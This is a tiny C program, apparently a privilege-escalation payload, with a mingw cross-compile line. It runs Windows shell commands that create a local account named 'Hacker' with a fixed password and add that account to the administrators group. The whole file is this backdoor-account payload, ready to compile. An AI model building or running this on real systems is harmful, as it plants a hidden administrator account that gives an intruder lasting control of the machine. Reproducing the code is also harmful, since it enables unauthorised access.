#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user Hacker password123! /add");
  i = system ("net localgroup administrators Hacker /add");
  
  return 0;
}
/* COMPILE SCRIPT: x86_64-w64-mingw32-gcc adduser.c -o adduser.exe */
